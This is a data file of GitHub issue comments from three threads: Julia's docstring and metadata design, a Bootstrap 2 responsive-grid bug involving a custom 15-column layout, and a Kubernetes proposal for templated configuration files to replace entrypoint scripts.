julia/JuliaLang/8514/57325472,8514,"@friend, the antecedent of ""that"" in your comment is unclear. ",,False
julia/JuliaLang/8514/57326128,8514,"I meant the issue of generating offline documentation. Alphabetical listings of documentation with a hierarchy implied by modules is what Java uses, and while that's not amazing, it does work. Indicating how to structure the presentation of docstrings seems like something that could easily be done by providing an external outline that references the objects to be documented in the desired organization. ",,False
julia/JuliaLang/8514/57327069,8514,"We already have our functions well separated in modules and if this forces us to do some more refactoring, that is not necessarily bad. ",,False
julia/JuliaLang/8514/57327321,8514,"@friend, we are ""there"" if we want to use this in Base, replacing our current RST documentation, because we need an offline manual.   It would be shortsighted to implement a feature that doesn't satisfy our own immediate needs! Hierarchies implied only be modules seem unacceptable to me, because most Julia modules have more functions than you would just want to list alphabetically ... our methods aren't nicely sorted into big class hierarchies like in Java, so the Java experience isn't a good analogue here. @friend, do you really want to separate Base into zillions of submodules?  Anything more than a dozen or so methods I would want to start grouping into subsections in a decent manual, and that would correspond to 100+ modules. ",,False
julia/JuliaLang/8514/57327766,8514,@friend if it is so awful why did you switch?  I'm assuming you wanted to use the tooling which is kind of case in point. ,,False
julia/JuliaLang/8514/57329708,8514,"Regarding redefining functions &amp; concatenating strings, the way Docile does it (and the way I originally proposed) is that the documentation ( or whatever) is keyed by the  for the generic documentation, and by  for method-specific documentation, and in each case stores arbitrary objects.   Asking for  would normally give you the generic documentation followed by a list of method-specific docs for .  This way, redefining functions doesn't concatenate documentation. Presentation systems (e.g.  or offline docs) have more flexibility in how they order things.  e.g. they don't have to sort methods by the order they happened to be defined in, but can instead sort them by their type signatures or whatever.  And they can put different methods into a bulleted list or whatever format is desired. String concatenation is not appropriate anyway if documentation is an arbitrary object, e.g.  or .  ",,False
julia/JuliaLang/8514/57330101,8514,"ReST was not really our choice; I believe @friend just did the work and it was a very solid improvement at the time. I would be much happier if we could fix the infamous ""extra newline"" bug. But I agree there is something to be said for a format that's already designed for this very purpose. Can anybody comment on how python or other languages deal with metadata for docstrings? I'm not 100% opposed to it, but I think it is necessarily an extension of a simpler feature. For example, we are likely to support anyway; metadata involves further decorations of that syntax that can be optional. ",,False
julia/JuliaLang/8514/57330755,8514,"@friend Honestly, I didn't want to switch, but someone (@friend, iirc) has already done the work and it was an improvement, so we just went with it. Read the docs is nice, but I still hate RST and I'm not that thrilled with the rest of the tooling around RST (random newlines anyone?). If we choose RST as a format, we're stuck with it. If we choose a format we like, we can build all the tooling we need. ",,False
julia/JuliaLang/8514/57330881,8514,"I'm confused about how the void string idea is going to work in the REPL. If I type a string into the REPL, then hit enter, what happens? ",,False
julia/JuliaLang/8514/57331007,8514,@friend Nothing – it has to be a string in void context followed by something that it can be attached to in the same input. ,,False
julia/JuliaLang/8514/57331261,8514,"So it will matter whether I execute string + code at two prompts or string at prompt, then code at prompt? ",,False
julia/JuliaLang/8514/57331635,8514,Isn't metadata something that can be handled within the docstring? Pandoc and Jekyll for example both support YAML front matter in markdown docs to attach arbitrary metadata. We also already have pure Julia Markdown and YAML parsers. ,,False
julia/JuliaLang/8514/57331690,8514,"The lack of structured information in Python has been a longstanding problem, as I understand it. Syntax-wise, I would suggest something like the following That is, you would use the  keyword for anything more complex than a string literal (or string macro).  e.g. for generic documentation objects (not strings), or to provide metadata (a Dict of some kind) which could be a variable as in the last example (to share metadata for several related functions). ",,False
julia/JuliaLang/8514/57331801,8514,plus one to metadata inside the doc string. ,,False
julia/JuliaLang/8514/57331998,8514,Do you anticipate entering a lot of doc strings at the prompt? ,,False
julia/JuliaLang/8514/57332014,8514,Metadata inside the docstring implies that construction cannot happen lazily as you would have to parse all docstrings (or eval if they are objects) before you could properly organize them. ,,False
julia/JuliaLang/8514/57332209,8514,"Problems with putting the metadata inside the docstring  It requires us to have ""Julia-flavored"" markdown (or whatever) with our own magic metadata markers. It requires us to specify a docstring format, rather than separating format from metadata, and relying on  to convert arbitrary objects to output formats. It makes it hard to share metadata ... e.g. you will often have several methods with the same metadata (e.g. they are all in the section ""Mathematical functions"" and the subsection ""Special functions"" as in my example above), and it would be a lot nicer to not have to retype this in each docstring.  ",,False
julia/JuliaLang/8514/57332306,8514,Package loading is already a performance problem – constructing lots of dicts during parsing is going to make it way worse. ,,False
julia/JuliaLang/8514/57332587,8514,Metadata could be a list of pairs  and then the overhead would be smaller. ,,False
julia/JuliaLang/8514/57332668,8514,I have zero problem with there being a Julia-flavored markdown format. I suspect it is inevitable. We should try to make sure that it matches the IJulia-flavored markdown as much as possible. ,,False
julia/JuliaLang/8514/57332952,8514,"YAML has a standard document begin/end markers. I don't see a standardized docstring format as a bad thing. YAML supports references. So you could write the full metadata once, tag it, then reference it in other docstrings. ",,False
julia/JuliaLang/8514/57333590,8514,"I think that having the organization of how doc strings are presented be external to the code and docs is a better approach. I.e. you have an outline where you refer to entities that have doc strings and a tool that weaves this together into HTML pages that can go online. Trying to cram all of the information needed to weave individual doc strings into a coherent final document just isn't going to work well. The doc strings provide bits of content that can be either consumed individually from the REPL or reused when putting together complete documentation. Putting all the organization and metadata into the doc strings is like a worse version of literate programming, which itself hasn't panned out that well. ",,False
julia/JuliaLang/8514/57333756,8514,"@friend, I just did a little benchmark.  ing a file defining 10,000 random string constants took 1.47 seconds, while ing a file defining 10,000 random  dictionaries took 3.16 seconds.  This difference doesn't seem that substantial to me, especially since most modules will define much less metadata than this. ",,False
julia/JuliaLang/8514/57334017,8514,2x slower is huge considering the the massive amount of work you have to go through to make the frontend 2x faster. ,,False
julia/JuliaLang/8514/57334121,8514,"@friend, losing a factor of 2 in something that only takes 1% of the total loading time for a module means losing a factor of 1%. That being said, having to put a separate placeholder in an offline ""manual outline"" for each function that you want to appear there does not seem terrible to me. ",,False
julia/JuliaLang/8514/57334213,8514,"Good documentation combines introductory and transitional material with bits of reference. An outline document is a good place for the introductory and transitional material, and it can simply splice in doc strings in the appropriate places. That way the details remain up-to-date and near the definitions of the functions being described, while the code isn't cluttered with lots of prose, and it isn't forced to be concerned with the structure of the documentation, which often doesn't match the structure of the code. ",,False
julia/JuliaLang/8514/57335256,8514,"So basically, I'm proposing this for the overall documentation  doc strings provide bits of markdown-flavored reference material associated with specific objects and symbols there is no structure and no metadata for doc strings beyond this – they can be queried and displayed in the REPL or in other interfaces like IJulia and Juno, but they're just organized like a key-value store. high-level documentation is written in the same markdown-flavored format, but it can easily splice in bits of doc string so that the material stays in sync and doesn't have to be repeated.  ",,False
julia/JuliaLang/8514/57336677,8514,"I don't understand how you'd ""easily"" plug in doc strings. It seems easier indicate sections next to the methods; how do I indicate which function/method I want to plug in, in the outline-thing? (vs. writing the outline/intro material and then plugging in the whole section of docstrings at once.) On Tue, Sep 30, 2014 at 1048 AM, Stefan Karpinski &lt;notifications@friend.com ",,False
julia/JuliaLang/8514/57338017,8514,"Totally on board for 1 and 3. I would still prefer to support in-docstring metadata, but I see it as non-essential, and could easily be added later. One issue with splicing in docstrings is that adding a new method necessitates changing the documentation in two places (docstring, and external docs). Whereas metadata would allow defining groups of docstrings to splice in together. I could imagine using a template system like mustache. So external docs would look like ",,False
julia/JuliaLang/8514/57339587,8514,"Yes, just what @friend said. I think some amount of metadata in doc strings makes sense – just enough so that you can query them by keywords or something. That could easily be satisfied by having a convention that writing  at the bottom of a doc string allows the string to be retrieved by keyword queries. Making this mechanism fully programmable strikes me as asking for abuse and overcomplication. ",,False
julia/JuliaLang/8514/57339897,8514,"Does  mean the function-level documentation or all documentation? What if I only want one method of ? On Tue, Sep 30, 2014 at 1116 AM, Stefan Karpinski &lt;notifications@friend.com ",,False
julia/JuliaLang/8514/57350291,8514,"I can tolerate omitting generic metadata, but I would strongly prefer using custom string (or other object) types to indicate format, with  for output.  Writing  instead of  is only two extra characters, which is a small price to pay for not locking ourselves into Markdown for the next 20 years. We'll want a string macro anyway, so that we don't need to escape  or  in code samples or LaTeX equations.  LaTeX equations are basically unusable without a string macro to suppress escaping.  Base can ship with only  () (and also text/plain strings, of course), which will serve the purpose of encouraging everyone to use the same format. ",,False
julia/JuliaLang/8514/57351715,8514,"(Though as soon as you start thinking about adding custom markdown extensions like keywords, I think the issue of metadata should be revisited.  If you think that creating metadata dicts will slow down loading, wait until you actually try parsing the docstrings at load time.   If you separate the metadata and the docstrings, each docstring need only be parsed when it is displayed.   Dicts are  way more flexible, will arguably be easier to implement because they use the existing parser, and don't require custom markup flavors.) ",,False
julia/JuliaLang/8514/57364343,8514,"I am extremely hawkish about load time but I'm not really worried about the slowdown from metadata dicts on docstrings, for reasons that have been discussed already (1) they're not all that slow, (2) not all docstrings will have them, (3) they can be shared among docstrings. My main concern is getting something simple working first so we can have help and docs for packages ASAP. After that there are concerns about complexity and where various information should be stored, but we can continue to discuss that while enjoying the availability of package help ) ",,False
julia/JuliaLang/8514/57365866,8514,plus one to having something that works for packages asap. ,,False
julia/JuliaLang/8514/57368284,8514,"Yes, plus one to having something vaguely like what's been discussed in this thread soon. I'm happy to adjust Docile to match whatever makes it into Base so that 0.3 packages can have documentation too. ",,False
julia/JuliaLang/8514/57378024,8514,"I agree that we should get something asap, with the caveat that major flaws and disagreements should be things that are resolvable later without much breakage. Adding documentation metadata is something that can be done later without breakage, because most docstrings won't have metadata so we will want an optional syntax anyway. Changing  to  if you want markdown-syntax docstrings will be a painful breakage to impose later. ",,False
julia/JuliaLang/8514/57385994,8514,"Regarding the  vs  change, if the default is markdown, then changing later is a matter of making markdown the default and allowing other formats optionally. It strikes me as weird to indicate the flavor of markup on a per-doc-string basis. Are you going to use lots of different markups in a single file or even a single project? I'm really not convinced that we'll ever need more than one. ",,False
julia/JuliaLang/8514/57393740,8514,"@friend, note that we'll need a string macro anyway in order to easily use LaTeX equations in Markdown (otherwise you have to backslash like crazy). ",,False
julia/JuliaLang/8514/57394552,8514,That would be true if we couldn't change the parser ;-) ,,False
julia/JuliaLang/8514/57413727,8514,"I would prefer format-agnostic documentation (requiring only writemime). I don’t think “getting something out fast” is affected by which of these we chose. Making something work for special Julia Markdown strings only vs. an equivalent MarkdownString type doesn’t seem like a big difference as far as implementation effort. Forcing everyone to use the same format seems unfortunate. I agree with having a strong default (i.e. shipping and using only one format in base), but choosing not to support any other format is actively preventing anyone from ever using a different format. There is always some dissent about formats, and if someone strongly prefers rst for their project (for the toolchain, or whatever), then there’s no reason to actively prevent them from doing so. An example of using different types of documentation in one package some documentation might be in a separate file, so those functions would just like to refer to the file path &amp; have the file actually read lazily. This could be accomplished with a different type (FileDocString or whatever) that behaves appropriately. Allowing user-defined documentation formats would also allow users to define their own extensions to Julia Markdown -- and try them out without forcing them on anyone else or needing to modify the Julia parser. ",,False
julia/JuliaLang/8514/57418977,8514,"FWIW I'm in violent agreement with @friend w.r.t allowing whatever system we end up with to store arbitrary metadata, not just strings. My impression is that the clojure community (e.g.) has benefited tremendously from this and built some really cool stuff (core.typed anyone?) on top of it, and it seems uncharacteristically restrictive (for what I see as the ""Julian"" attitude about this sort of thing) to not allow it. ",,False
julia/JuliaLang/8514/57424324,8514,What @friend said! Just learned about how Clojure does this  - very neat! IMO a good implementation would make documentation a special case of a general mechanism to attach metadata to certain kinds of objects. (at least under the hood while providing sufficient syntactic sugar.) ref #3988 ,,False
julia/JuliaLang/8514/57426034,8514,"which, unless I'm mistaken, is exactly what @friend has been arguing for. ",,False
julia/JuliaLang/8514/57448674,8514,"I like the idea of having ""..."" / """"""...""""""be Julia's default Markdown, whatever flavor that is, so we and our tools don't have to think very hard about how to deal with basic comments. I'd also like to see provision, even if just a placeholder for now, to add flexible metadata.  Although most docs right now are either plain text or rich text, there are plenty of areas where a picture or equation would really help, and with tools like IJulia and Juno we already have much of the infrastructure required to serve rich help. ",,False
julia/JuliaLang/8514/57480894,8514,"Note also that if we support attaching an arbitrary ""documentation"" object with output via , then including dictionaries of metadata can be implemented on top of this.  e.g. you can have a  type that wraps the ""actual"" documentation object plus a  dictionary of other metadata (Where, as I mentioned above, we probably need an optional  keyword for any documentation object that is not a string literal or string macro.) ",,False
julia/JuliaLang/8514/57481472,8514,"FWIW, I find @friend's suggestion really compelling. It seems much easier to make an initial pass that's very vague about what ""should"" go in a MetaDoc object and flesh it out, than to take a stricter rule about strings and later replace it with MetaDoc objects. ",,False
julia/JuliaLang/8514/57563194,8514,"I'll just note as a minor point that using some kind of clue, like  or  or whatever, would make things much simpler for editors' and IDE's highlighting, for properly displaying special characters, LaTeX etc., since we can't really expect editors to implement full-blown parsers. Maybe that could be mitigated by using ""a string at global scope is documentation"" as a proxy rule, but I suspect that could turn out messy. ",,False
julia/JuliaLang/8514/57898623,8514,"We already have a concept that for creating new syntactic elements, and they are called macros and string macros. Having different rules for  in different contexts would be inconsistent, making Julia more confusing. I'd argue that two extra letters to type for Markdown parsing isn't a big problem. If you use markdown for formatting your documentation, you'll probably have a multiline doc, and two characters seem like a small annoyance. I agree that it is poor style to mix different documentation formats in a single file, it might sometimes be useful. That way you can gradually change format in a file without having to fix all the issues at once. Usually design discussions in Julia has not been won by the argument ""someone is going to use this feature to write horrible unreadable code"". ",,False
julia/JuliaLang/8514/57899055,8514,"I have to disagree with this. Firstly, a lot of docstrings are likely to look like i.e. not multiline. That said, it's not really about the two character overhead. The fact is that most people will use the most the most convenient documentation form available, so defaulting to plain docstrings amounts to endorsing them. I'm all for supporting richer formats ( etc.) but supporting both plain and rich docs doesn't make much sense – markdown opens a lot of opportunities (nice presentation, syntax highlighting, structured information etc.) without making things more cumbersome, so we should encourage people to use it over plain text as much as possible. Treating  docstrings as  is a very simple and effective way to do that. ",,False
julia/JuliaLang/8514/57904820,8514,"This is a good idea. One of the problems with Python docstrings is that they are plain text, and you can't get people to use anything else unless it's endorsed by the language implementation. TIMTOWTDI leads to everyone using the lowest common denominator, i.e. plain text. Unambiguously going with one default markup language in Julia makes it better. Markdown is a good choice, especially as IJulia is the de facto ""more than plaintext"" display environment for Julia. ",,False
julia/JuliaLang/8514/57909293,8514,Putting myself in the loop to make sure Lint can check through doc string correctly. ,,False
julia/JuliaLang/8514/57909930,8514,"I think that rather the problem with Python docstrings is that there is no standard way of specifying the format. That means that when you aggregate documentation from docstrings, you have to guess the format, and computers are bad at guessing, so the feature is little used. @friend Maybe that is a valid case, but if I want to save characters to type I'll rather not have to repeat the signature inside the docstring, but have it automatically captured from the actual signature on the next line. ",,False
julia/JuliaLang/8514/58513131,8514,"By the way, another reason to support (a) plain-text strings and (b) non-literal documentation strings is importing help from other languages. e.g. in PyPlot I define various functions which are wrappers around Python functions, and I want their help to be automatically imported from the Python docstring.  If we have a  keyword (or ) that supports arbitrary Julia expressions, and allows plain-text strings, this will be easy ",,False
julia/JuliaLang/8514/60149092,8514,Just checking in here to see if we have something usable to start with. Are we still waiting on ? ,,False
julia/JuliaLang/8514/60161602,8514,"Markdown.jl is already in that other PR (which is good to go as far as I'm concerned, though I'm happy to make any changes if I've missed anything of course). ",,False
julia/JuliaLang/8514/63051744,8514,Oh yeah we can totally close this ,,False
bootstrap/twbs/7745/13830296,7745,"I was looking at the media query for (max-width 767px) in my custom bootstrap downloaded from the site, and I believe it has an error in it. I customized my bootstrap using the online customization to have 15 columns, which worked out great. Yet I believe this code is incorrect and should be referencing span15 in my case, or the largest span# in any custom bootstrap.css .span12, .row-fluid .span12 {     width 100%;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;   } Let me know if my assumption is true, as I don't immediately detect any difference in my layout by changing the 12 to 15. ",,False
bootstrap/twbs/7745/17260531,7745,"If you post code on github use the appropriate markdown. Link is on the top right of the comment box. I am not working with 2.0 anymore but i can confirm this code is in the generated CSS I just downloaded to to look at. This should indeed output as  based on the custom span value used. I used 16 as a custom value everything else is generated as it should be but this part is fixed to 12 is seems. If the assumption is true this means if you use  this will break your layout. Like . span15 should also not have the optimal layout but there are very few cases people use the maximum span inside a row I guess since there is not really a point, that maybe for dynamic content. But if you use spans inside rows you should definitely see changes when your switch from 12 to 15. You should now have the space of 3 spans empty at the right of your rows. ",,False
bootstrap/twbs/7745/17261440,7745,"I'm not sure what you're talking about with regard to proper markdown. It looks fine and readable to me...? I don't have any span 12s on my pages, but I bet you're right! I bet if I did, I'd be wondering why my layout is broken. Concerning your last paragraph, that's true. But what I'm saying is that changing .span12, .row-fluid .span12 { width 100%; -webkit-box-sizing border-box; -moz-box-sizing border-box; box-sizing border-box; } to .span15, .row-fluid .span15 { width 100%; -webkit-box-sizing border-box; -moz-box-sizing border-box; box-sizing border-box; } doesn't appear to do anything to my layout at sizes less than 767px. I don't see a difference at least. Should I? ",,False
bootstrap/twbs/7745/17264689,7745,Closing this out—the grid system is massively overhauled in v3 and everything does get . ,,False
bootstrap/twbs/7745/17285845,7745,"@friend well your code is not indented what is probably caused by just copy pasting it and its not in monospace font so you not used the markdown for it. For this short parts of code not so big deal but you should just use it when posting on github. Look I think it's a bit harsh to just close it since it is a actual bug you discovered. The bug should be easy to find and fix. But on the other hand makes sense since in 3.0 things are handled so much better. And no once the spans are not floating you should not see a difference. So you do actually see one when 768+, thats what I meant. I suggest you dig a bit into it and learn what the grid actually does. You may dig down the source of this bug on the way. Or simply not use span12 and span15 in your case and you're good. I personally would only use even numbers for the grid btw since you can't 50/50 otherwise. ",,False
bootstrap/twbs/7745/17292488,7745,"Thanks for the extra reply nextgenthemes! I was hoping you'd answer my question. ) For my client's website, the majority of their columns in the design I made are 3 and 5 column, and you can't do 5 centered columns in an even numbered grid that also can do 3 columns. You can only do 5 column in these grid column amounts 5, 10, 15, 20, and so on. You can do 3 column layouts in these column amounts 3, 6, 9, 12, 15, 18, 21. 15 was the best way for me, and the design has been working beautifully (and easily) ever since I switched to a custom 15 column grid. I'm glad the customize section of Bootstrap exists, otherwise I never would have been able to do all of the math, however, I must admit the math for the column and gutter sizes did take me a few hours of trial and error. If what I said above doesn't make sense to anybody who ends up reading this via a google search someday... The reason I used a 15 column grid is because... span5, span5, span5 = 3 column layout span 3, span 3, span 3, span 3, span 3 = 5 column layout What nextgenthemes says about not being able to do 50/50 using supplied CSS classes is true, however that is extremely easy to write custom CSS for. In fact, I am using custom CSS to do exactly that for something that I want to go from span5, span10 to 50/50 on screen sizes smaller than 767px (by default all spans collapse into 1 column at this size). Maybe this will help someone some day, so I'll go through the process. What I did was replace my span5 and span10 with spain5nocollapse and spain10nocollapse in the HTML file, then put this code into my custom CSS. /note you'll need to open your bootstrap-responsive or custom bootstrap.css and find the appropriate percentages for your site/ .row-fluid .spain10nocollapse {     width 65.29284164859001%; /see note above/     width 65.23861171366593%; /see note above/     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } .row-fluid .spain5nocollapse {     width 30.585683297180044%; /see note above/     width 30.531453362255967%; /see note above/     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } @friend (max-width 767px) { .row-fluid .spain10nocollapse {     width 50%;     width 50%;     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } .row-fluid .spain5nocollapse {     width 50%;     width 50%;     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } } There's probably some extraneous code in there that isn't necessary, but I haven't gotten to the stage of my programming where I care about cleaning up redundancy. Hope that helps someone in the future. BTW, the reason I am using ""spain"" instead of ""span"" is because I didn't want any CSS that affects all classes with the name ""span"" to mess with these styles. ",,False
bootstrap/twbs/7745/17292680,7745,"The format for two of those lines of code is wrong. They are supposed to be *width Guess I should have tried harder to find the way to input code on here, but I don't see any way of doing it... ",,False
bootstrap/twbs/7745/17347363,7745,Even after I told you you post huge chunks of code without proper formatting. Anyway this was about your bug report and I confirmed that bug! The issue is closed and this is not the place to get help for your personal stuff. Try stackoverflow or the BS IRC channel. ,,False
bootstrap/twbs/7745/17491512,7745,"Thanks nextgenthemes, I'll follow your example and be a jerk who can't read code that isn't inserted in an inset gray box and post rude comments when someone tries to help others. Or maybe I should say it like this so you're unable to read it. .nextgenthemes { display jerk; readability none; response-mode uncalled-for; } ",,False
bootstrap/twbs/7745/17587088,7745,"Keep the name-calling and attitude out of our issues, please. Folks are here to learn, get help, and report bugs. They're not here to see folks bicker among themselves—that doesn't help anyone. @friend He's referring to the ""GitHub Flavored Markdown"" link directly above the comment field on the right. Click that and it will show you how to use Markdown so you can take advantage of code syntax highlighting. Alternatively, have a look here. @friend I appreciate you trying to help, but please do your best to avoid the attitude in the future. You may not have even meant it, but I hope you can see how easy it is for folks to take it one way or the other. It's tough communicating via text like this—tone and context are easy to miss. ",,False
kubernetes/kubernetes/30716/171535837,30716,"Summary I would like us to get rid of custom entrypoint.sh scripts by supporting templating of in-container files. The Problem Despite current ConfigMap features, it remains necessary for many or most container images under Kubernetes to include ""entrypoint.sh"" scripts and/or customizations to the containerized applications which are particular to the Kubernetes environment.  This results in forking of upstream images and limits portability of images between environments.  It also results in some very hackish startup scripts (see Kelsey's ""init scripts for hipsters""). Based on feedback through numerous issues and PRs, the main shortcoming in ConfigMap which would allow elimination of entrypoint scripts is the inability to include elements into a configuration file which are only available at deployment time.  For example, some services, such as clustered databases or load balancers, need to know the Pod IP or the pod name as part of their configuration. Suggested Solution ConfigTemplate Several proposals have been made to enhance ConfigMaps to embrace templating functionality, and they have met with significant opposition. My proposal is that we create a new object ... named here a ""ConfigTemplate"" as placeholder until someone suggests a better one.  This Template object would produce a file inside the deployed container, and could consume the Downward API, Secrets, and ConfigMaps in order to populate a template.  This would be largely the same as PR #30502, but with a new object type instead of overloading ConfigMaps. At a sketch, a ConfigTemplate for an ini-style config file could be inlined, and might look like this Note what syntax we use for the exact substitutions is unimportant; let's just use whatever is easiest to support/code. For inline versions, it is likely that only key $value substitutions would be supported.  For more complex behavior, including differently-formatted configuration files, we'd support file-based substitution, ala The file in question would be some kind of text file, with substitution tags in whatever syntax we decide on.  Either way, the ConfigTemplate would then be used inside Pod definitions like this Why not volumes? You'll notice above that I'm not taking a regular ""volume"" approach to this. That's because in many cases ... including some cases I have personally ... the rendered config file needs to share directories with files which come from the container image.  Doing this in a volume is complicated, and will lead (again) to custom entrypoint.sh scripts. However, if there are strong reasons to handle this as a volume, that could be worked around. Templating Engines and Sidecars There is some discussion about how templating would be handled and what templating engine we'd use.  This includes a suggestion by @friend that this be entirely sidecar functionality. I will argue that providing config file templates which allow containers to start inside Kubernetes pods without modification is fairly central functionality to what Kubernetes does, and as such the general Template object should be a core Kubernetes object.  However, I can certainly see the value of allowing the user to plug in their choice of rendering library for the actual template rendering for file-based templates; if nothing else, it would forestall a lot of arguments about syntax. Even in that case, however, I would like us to provide a built-in very simple template renderer, one which is capable of just swapping in upstream facts for some specific variable syntax, such as ${fact} or {{fact}} or similar, and nothing else.  Such a built-in renderer would satisfy 90% of users, and not push the user into installing extra dependencies. Alternatives I cannot personally think of any alternatives which will lead to the elimination of the majority of entrypoint.sh scripts.  Suggestions welcome. References  PR #30502 Issue #29607 Issue #28560  ",,False
kubernetes/kubernetes/30716/240292538,30716,cc @friend @friend @friend @friend @friend @friend/rh-cluster-infra ,,False
kubernetes/kubernetes/30716/240341499,30716,"How far can you get using an init-container? For example init-container consumes data from a configmap, substitutes values, and writes the resulting complete config file to a a path in an EmptyDir.  The main container reads the config file generated by the init container. ",,False
kubernetes/kubernetes/30716/240375767,30716,"@friend I've tried to address init-container suggestion in a separate thread, it works for initial configuration. In the future, If we want to allow proper config change handling, it would be better to have it natively supported by Kubernetes ecosystem. ",,False
kubernetes/kubernetes/30716/240512944,30716,"@friend two comments on init containers  we'd need to automate that process via some kind of Kubernetes object; otherwise it would be just a case of moving the burden on container image authors without decreasing it (in fact, we'd be increasing it).  If Template works via an init container under the hood, that's fine with me.  See my note above about the issues with volumes and config files.  In many cases, you want to only update 1 config file in a directory which may have several of them, such as for Postgres or Apache HTTPD or network-config.  Currently AFAIK there's no way to ""share"" a volume directory between files supplied by the image and files from the volume.  That would put users in the position of needing to re-create all of those config files, even if most of them are identical to the ones in the upstream image.  Which would then lead to out-of-sync issues if fixes are added to the config files in the upstream image.  Possibly merging the directories could be handled by the init container?  That is, it would pull files from the template, and the rest from the upstream image?  That would solve that issue, at least.   ",,False
kubernetes/kubernetes/30716/240523424,30716,"Image volumes have been requested - in the future that would address #2 as well.  In the short term we've said use an init container to handle that. On Wed, Aug 17, 2016 at 300 PM, Josh Berkus notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/240523972,30716,"Devils advocate - why can't you provide a custom Command to the container and apply the transformation in that container?  The entrypoint would then be in the pod definition, not the image.  While I'm sympathetic to templated config map, you can already templatize in Command and Args (IIRC), so this is already possible. ",,False
kubernetes/kubernetes/30716/240524863,30716,"Would be If config map was a valid target for env valueFrom (which it should be, because of secrets), then this should allow you to at least craft templates without changing the image. ",,False
kubernetes/kubernetes/30716/240530225,30716,"That strikes me as unsatisfying for a number of reasons First, it means sharing the configuration is harder -- with a ConfigTemplate, you can just say , and mount as a volume (and edit the template when necessary).  With this approach, you have to say ""go in to your pod, convert the entrypoint back into a single string, then put your environment file in a HEREDOC with cat, and the append the existing entrypoint, and hope you didn't screw anything up in there with quoting, because your entrypoint is now a big string blob instead of an array of arguments"". Secondly, it makes sharing the config harder -- you can just share the config template as standalone object, you have to share it as part of the pod spec, and then the receiver has to extract the relevant parts from the pod spec. Also, it makes the entrypoint on an image much harder to read -- you go from just having a command to having a chain of commands that do  and  and , and then launch the actual image.  That seems easy to mistype and misread. ",,False
kubernetes/kubernetes/30716/240538955,30716,"Templates of config are pretty closely coupled to pods.  You can always put the template in the config and combine them in the pod. The entrypoint is under the control of the pod author.  If the pod author doesn't control the image, they can control the entrypoint via the pod definition.  I'm fairly sure that we can provide an idiomatic representation of config templating in the pod template, which does allow references to other resources.  I am very skeptical of configmaps that point to other configmaps, so it's a much harder argument to say that we want to support references between a config map and another resource AND support references between pods and config maps. ",,False
kubernetes/kubernetes/30716/240540721,30716,"Generally our answer to this has been - ""init containers"".  Given that gives you access to a turing complete space, and everything we provide in a config map can be transformed, you can use any templating language you want, combine any config map you want, and control it all, without any changes to kubernetes.  The alternative - implement  - requires us to bless a templating language and implement additional code.  Why is ~200 chars of init container definition in the pod worse than ~200 chars of a configtemplate definition? ",,False
kubernetes/kubernetes/30716/240544956,30716,"As a note - my point here is not to dismiss ConfigTemplate out of hand, it is merely to ensure that the mechanisms that we have that should be able to solve this actually solve this in a clear and demonstrable way.  If they don't, they absolutely must be fixed. ",,False
kubernetes/kubernetes/30716/240572345,30716,"@friend can you give an example of an init container implementation, using current Kubernetes?  Because my experience is that they're more complicated than you describe.  But maybe I'm doing them badly. ",,False
kubernetes/kubernetes/30716/240623227,30716,"A few thoughts. First, a new object on its own does nothing for you.  You still need a new volume driver to project it into the FS.  given that, I don't think you actually need an API object at all.  What you have described looks like a volume. Second, there are tricks that can pull files from multiple volumes (secret, configmap, downwardapi) and project into a single directory, with the caveat that auto-updates don't work (bind mount semantics bite us).  If this is really a stumbling block, we can consider a way to project from multiple sources into a single volume.  @friend and I already sketched it out. Third, there are ways to inject a new entrypoint.sh into a container.  You can make a configmap with a key named  and the value being a shell script.  Mount that on /entry, and make your container's  be /entry/entrypoint.sh.  You don't need to customize upstream images for this.  If this is not satisfying, I would consider a ""literal"" volume driver that just copied a string into a file. Fourth, I didn't grok why a sidecar doesn't work?  Declare an emptydir called /config.  Mount it on both the sidecar and and the main app container.  The sidecar also mounts N configmaps and secrets and downward API.  The sidecar periodically evaluates a template (maybe a configmap or a flag) and fills in variables from the other configmaps and secrets.  It writes the results to /config/.config.tmp, compares /config/config.file with that tempfile and renames the tmp to the real name if needed.  The app container just watches inotify for changes to the /config/config.file. Lastly, nothing stops you from using third-party resource and flex volume to implement this yourself and prove us wrong.  If it turns out to be overwhelmingly popular we can either adopt it as standard or just endorse your cleverness ) On Wed, Aug 17, 2016 at 346 PM, Josh Berkus notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/240771207,30716,"@friend I'm not looking to make this possible, I'm looking to make it simple.  It's possible now, but a large number of our users can't figure out how to do it.  And this is a spec issue, so the purpose of this is ""let's determine the spec for this"". Projecting configuration files into running containers is something our users need to do for something like 3/4 of running containers.  Right now the standard approach for that is hackish entrypoint.sh scripts, which is a terrible state of the art, and causes a lot of folks to legitimately question whether they made a mistake moving away from CMS and towards orchestration. Something which 80% of our users need to do 75% of the time shouldn't be complicated or require advanced Kubernetes knowledge. It should be simple, obvious, and there should be a recommended mainstream way to do it.  Whether that's templates or config volumes or sidecars, I don't really care, provided that it's something which a new Kubernetes user can learn in 20 minutes. ",,False
kubernetes/kubernetes/30716/240775844,30716,"No disagreement, but we should first explore refinements on existing behaviors before piling on new abstractions and API kinds. On Thu, Aug 18, 2016 at 903 AM, Josh Berkus notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/240776467,30716,"I'm OK with that.  Would you be willing to sketch out a doc on how you'd do it, now?  Because you seem to find existing approaches easier than I do. ",,False
kubernetes/kubernetes/30716/240784847,30716,"I have zero bandwidth for the next few weeks.  We need community folks like yourself to come up to speed on alternatives and help make educated designs.  As much as I like having an opinion on everything, there aren't enough hours in the day.  The way this community grows and thrives is when new people step into the light and own problems ) I appreciate your vociferous advocacy of the user in this issue, so far... On Thu, Aug 18, 2016 at 920 AM, Josh Berkus notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/240791255,30716,I have created a simple PoC for configmap templating here  solution however uses downwardAPI volumes and the configfiles are simple another possible item type that can be used there. Your idea with bare files that can be placed anywhere seems to be superior. I don't know however how it would be with implementation. Also what would be the possibilities to implement some improved change propagation. ,,False
